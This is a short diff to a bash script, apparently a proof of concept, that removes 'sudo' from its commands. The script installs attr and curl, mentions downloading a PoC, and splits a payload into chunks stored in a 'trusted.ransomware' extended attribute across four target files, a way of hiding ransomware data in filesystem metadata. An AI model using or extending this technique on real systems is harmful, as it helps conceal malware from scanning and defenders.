@@ -19,8 +19,8 @@ fi
 # 1) Ensure xattr tools are installed
 if ! command -v setfattr &>/dev/null; then
   echo "[*] Installing attr + curl..."
-  sudo apt update
-  sudo apt install -y attr curl
+  apt update
+  apt install -y attr curl
 fi
 
 # 2) Download the new PoC
@@ -59,7 +59,7 @@ for idx in "${!CHUNKS[@]}"; do
   CHUNK_VAL="${CHUNKS[$idx]}"
   TARGET_FILE="${FILES[$idx]}"
   echo "[*] Writing part $((idx + 1)) to $TARGET_FILE"
-  sudo setfattr -n trusted.ransomware -v "$CHUNK_VAL" "$TARGET_FILE"
+  setfattr -n trusted.ransomware -v "$CHUNK_VAL" "$TARGET_FILE"
 done
 
 echo "[+] Done! Payload divided across 4 files matching '$PATTERN' in $TARGET_DIR."
